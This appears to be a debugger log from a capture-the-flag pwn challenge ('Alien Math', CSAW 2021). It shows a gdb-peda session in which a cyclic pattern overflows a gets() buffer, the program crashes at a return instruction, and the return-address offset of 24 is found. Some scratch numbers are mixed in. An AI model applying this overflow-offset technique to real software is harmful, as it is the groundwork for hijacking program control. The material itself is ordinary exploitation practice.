@@ -1,0 +1,87 @@
+gdb-peda$ run
+Starting program: /home/mito/CTF/CSAW_CTF_Qualification_Round_2021/Pwn_Alien_Math/alien_math 
+
+==== Flirbgarple Math Pop Quiz ====
+=== Make an A to receive a flag! ===
+
+What is the square root of zopnol?
+1804289383
+
+
+[-------------------------------------code-------------------------------------]
+   0x4014b1 <second_question+348>:	lea    rax,[rbp-0x30]
+   0x4014b5 <second_question+352>:	mov    rsi,rcx
+   0x4014b8 <second_question+355>:	mov    rdi,rax
+=> 0x4014bb <second_question+358>:	call   0x4010f0 <strncmp@plt>
+   0x4014c0 <second_question+363>:	test   eax,eax
+   0x4014c2 <second_question+365>:	jne    0x4014e8 <second_question+403>
+   0x4014c4 <second_question+367>:	lea    rdi,[rip+0xbe6]        # 0x4020b1
+   0x4014cb <second_question+374>:	call   0x401100 <puts@plt>
+Guessed arguments:
+arg[0]: 0x7fffffffdcf0 ("7759406485255323229225")
+arg[1]: 0x7fffffffdd30 --> 0x3539333731 ('17395')
+arg[2]: 0x16 
+arg[3]: 0x7fffffffdd30 --> 0x3539333731 ('17395')
+
+
+
+0000000000000000000000
+0253647586970819203142
+0253647586970819203142
+
+02536475869708192
+
+1111111111111111111111
+1627384950617283940516
+
+******** HIT ! ********
+785644589921306542879
+7759406485255323229224
+7759406485255323229225
+******** HIT ! ********
+7856445899213065428791
+
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7fffffffdcc0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhA)
+RBX: 0x15 
+RCX: 0x7ffff7dcda00 --> 0xfbad2288 
+RDX: 0x7ffff7dcf8d0 --> 0x0 
+RSI: 0x405671 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAA)
+RDI: 0x7fffffffdcc1 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA)
+RBP: 0x41412d4141434141 ('AACAA-AA')
+RSP: 0x7fffffffdcd8 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A")
+RIP: 0x4012e5 (<final_question+79>:	ret)
+R8 : 0x4056ee --> 0x0 
+R9 : 0x7ffff7fd64c0 (0x00007ffff7fd64c0)
+R10: 0x3 
+R11: 0x346 
+R12: 0x4011b0 (<_start>:	endbr64)
+R13: 0x7fffffffde40 --> 0x1 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x4012de <final_question+72>:	call   0x401150 <gets@plt>
+   0x4012e3 <final_question+77>:	nop
+   0x4012e4 <final_question+78>:	leave  
+=> 0x4012e5 <final_question+79>:	ret    
+   0x4012e6 <second_question_function>:	endbr64 
+   0x4012ea <second_question_function+4>:	push   rbp
+   0x4012eb <second_question_function+5>:	mov    rbp,rsp
+   0x4012ee <second_question_function+8>:	mov    DWORD PTR [rbp-0x14],edi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdcd8 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A")
+0008| 0x7fffffffdce0 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A")
+0016| 0x7fffffffdce8 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A")
+0024| 0x7fffffffdcf0 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A")
+0032| 0x7fffffffdcf8 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A")
+0040| 0x7fffffffdd00 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A")
+0048| 0x7fffffffdd08 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A")
+0056| 0x7fffffffdd10 ("AJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9A")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x00000000004012e5 in final_question ()
+gdb-peda$ patto (AAD
+(AAD found at offset: 24
